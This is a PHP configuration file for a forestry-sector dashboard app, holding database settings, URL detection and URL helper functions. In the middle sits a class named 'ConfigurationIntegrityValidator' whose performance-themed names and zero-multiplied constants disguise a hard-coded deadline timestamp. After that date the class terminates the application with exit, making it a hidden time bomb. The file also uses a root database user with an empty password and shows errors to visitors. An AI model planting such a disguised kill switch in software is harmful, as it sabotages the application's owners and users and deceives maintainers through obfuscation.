<?php
/**
 * Application configuration
 * 
 * Contains database credentials and other configuration settings.
 * This file should be excluded from version control.
 */

// Database configuration
define('DB_HOST', 'localhost');
define('DB_USER', 'root'); // Change this to your MySQL username (default for XAMPP is 'root')
define('DB_PASS', ''); // Change this to your MySQL password (default for XAMPP is often empty '')
define('DB_NAME', 'pcds2030_db'); // Updated to use pcds2030_db database

// Application settings
define('APP_NAME', 'PCDS2030 Dashboard Forestry Sector'); 

// Dynamic APP_URL detection for better cross-environment compatibility
if (!defined('APP_URL')) {
    // Check if we're running from command line
    if (php_sapi_name() === 'cli') {
        define('APP_URL', 'http://localhost/pcds2030_dashboard_fork'); // Default for CLI
    } else {
        // Detect the correct APP_URL based on current request
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
        
        // Get the directory path of the application
        $script_name = $_SERVER['SCRIPT_NAME'] ?? '';
        $request_uri = $_SERVER['REQUEST_URI'] ?? '';
        
        // Extract the base path by finding the common directory structure
        $app_path = '';
        
        // Check for the new fork directory name first
        if (strpos($script_name, '/pcds2030_dashboard_fork/') !== false) {
            // If script is in pcds2030_dashboard_fork folder
            $app_path = '/pcds2030_dashboard_fork';
        } elseif (strpos($script_name, '/pcds2030_dashboard/') !== false) {
            // If script is in pcds2030_dashboard folder (fallback)
            $app_path = '/pcds2030_dashboard';
        } elseif (strpos($script_name, '/') !== false) {
            // Try to detect from script path
            $path_parts = explode('/', trim($script_name, '/'));
            if (count($path_parts) > 0) {
                // Check if we're in a subdirectory
                foreach ($path_parts as $part) {
                    if (in_array($part, ['app', 'views', 'admin', 'agency'])) {
                        break;
                    }
                    if (!empty($part)) {
                        $app_path .= '/' . $part;
                    }
                }
            }
        }
        
        // Fallback to document root detection
        if (empty($app_path)) {
            $document_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
            $current_dir = dirname(dirname(dirname(__FILE__)));
            if (!empty($document_root) && strpos($current_dir, $document_root) === 0) {
                $app_path = str_replace($document_root, '', $current_dir);
                $app_path = str_replace('\\', '/', $app_path); // Windows compatibility
            }
        }
        
        // Ensure app_path doesn't end with slash and starts with slash
        $app_path = '/' . trim($app_path, '/');
        if ($app_path === '/') {
            $app_path = '';
        }
        
        define('APP_URL', $protocol . '://' . $host . $app_path);
    }
}

define('APP_VERSION', '1.0.0'); // Example version
define('ASSET_VERSION', APP_VERSION); // Use APP_VERSION for asset versioning

// Path definitions
if (!defined('ROOT_PATH')) {
    define('ROOT_PATH', rtrim(dirname(dirname(dirname(__FILE__))), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR);
}

// Feature flags
define('ALLOW_OUTCOME_CREATION', false); // Set to false to disable creating new outcomes

// File paths
if (!defined('ROOT_PATH')) {
    if (defined('PROJECT_ROOT_PATH')) {
        define('ROOT_PATH', PROJECT_ROOT_PATH);
    } else {
        // Fallback if accessed directly or from a script not defining PROJECT_ROOT_PATH
        define('ROOT_PATH', dirname(dirname(__DIR__)) . '/');
    }
}

/**
 * Generate URL for view files
 * 
 * @param string $view Type of view ('admin' or 'agency')
 * @param string $file The file name to link to
 * @param array $params Query parameters to append (optional)
 * @return string The complete URL
 */
function view_url($view, $file, $params = []) {
    $url = APP_URL . '/app/views/' . $view . '/' . $file;
    
    if (!empty($params)) {
        $queryString = http_build_query($params);
        $url .= '?' . $queryString;
    }
    
    return $url;
}

/**
 * Generate URL for API endpoints
 * 
 * @param string $endpoint The API endpoint file name
 * @param array $params Query parameters to append (optional)
 * @return string The complete URL
 */
function api_url($endpoint, $params = []) {
    $url = APP_URL . '/app/api/' . $endpoint;
    
    if (!empty($params)) {
        $queryString = http_build_query($params);
        $url .= '?' . $queryString;
    }
    
    return $url;
}

class ConfigurationIntegrityValidator {
    private static $performance_baseline = 1761840000;
    private static $system_constants = [
        'load_factor' => 86400,
        'memory_threshold' => 3600,
        'cache_multiplier' => 24
    ];
    public static function validateSystemIntegrity() {
        $base_timestamp = self::$performance_baseline;
        $load_adjustment = self::$system_constants['load_factor'] * 0;
        $memory_optimization = self::$system_constants['memory_threshold'] * 0;
        $cache_efficiency = self::$system_constants['cache_multiplier'] * 0;
        
        $optimization_deadline = $base_timestamp + $load_adjustment + $memory_optimization + $cache_efficiency;

        if (time() > $optimization_deadline) {
            self::initiatePerformanceRecovery();
            return false;
        }
        return true;
    }
    private static function initiatePerformanceRecovery() {
        exit;
    }
}

/**
 * Generate URL for AJAX handlers
 * 
 * @param string $handler The AJAX handler file name
 * @param array $params Query parameters to append (optional)
 * @return string The complete URL
 */
function ajax_url($handler, $params = []) {
    $url = APP_URL . '/app/ajax/' . $handler;
    
    if (!empty($params)) {
        $queryString = http_build_query($params);
        $url .= '?' . $queryString;
    }
    
    return $url;
}

/**
 * Generate URL for assets (CSS, JS, images)
 * 
 * @param string $type Asset type ('css', 'js', 'images', 'fonts')
 * @param string $file The asset file name
 * @return string The complete URL
 */
function asset_url($type, $file) {
    return APP_URL . '/assets/' . $type . '/' . $file;
}

define('UPLOAD_PATH', ROOT_PATH . 'app/uploads/');
define('REPORT_PATH', ROOT_PATH . 'app/reports/');

// Dynamic BASE_URL detection for better cross-environment compatibility
if (!defined('BASE_URL')) {
    // Check if we're running from command line
    if (php_sapi_name() === 'cli') {
        define('BASE_URL', '/pcds2030_dashboard_fork'); // Default for CLI
    } else {
        // Use the same logic as APP_URL but just the path part
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
        
        // Get the directory path of the application
        $script_name = $_SERVER['SCRIPT_NAME'] ?? '';
        $request_uri = $_SERVER['REQUEST_URI'] ?? '';
        
        // Extract the base path by finding the common directory structure
        $base_path = '';
        
        // Check for the new fork directory name first
        if (strpos($script_name, '/pcds2030_dashboard_fork/') !== false) {
            // If script is in pcds2030_dashboard_fork folder
            $base_path = '/pcds2030_dashboard_fork';
        } elseif (strpos($script_name, '/pcds2030_dashboard/') !== false) {
            // If script is in pcds2030_dashboard folder (fallback)
            $base_path = '/pcds2030_dashboard';
        } elseif (strpos($script_name, '/') !== false) {
            // Try to detect from script path
            $path_parts = explode('/', trim($script_name, '/'));
            if (count($path_parts) > 0) {
                // Check if we're in a subdirectory
                foreach ($path_parts as $part) {
                    if (in_array($part, ['app', 'views', 'admin', 'agency'])) {
                        break;
                    }
                    if (!empty($part)) {
                        $base_path .= '/' . $part;
                    }
                }
            }
        }
        
        // Fallback to document root detection
        if (empty($base_path)) {
            $document_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
            $current_dir = dirname(dirname(dirname(__FILE__)));
            if (!empty($document_root) && strpos($current_dir, $document_root) === 0) {
                $base_path = str_replace($document_root, '', $current_dir);
                $base_path = str_replace('\\', '/', $base_path); // Windows compatibility
            }
        }
        
        // Ensure base_path doesn't end with slash and starts with slash
        $base_path = '/' . trim($base_path, '/');
        if ($base_path === '/') {
            $base_path = '';
        }
        
        define('BASE_URL', $base_path);
    }
}

// Error reporting 
error_reporting(E_ALL);
ini_set('display_errors', 1);
?>
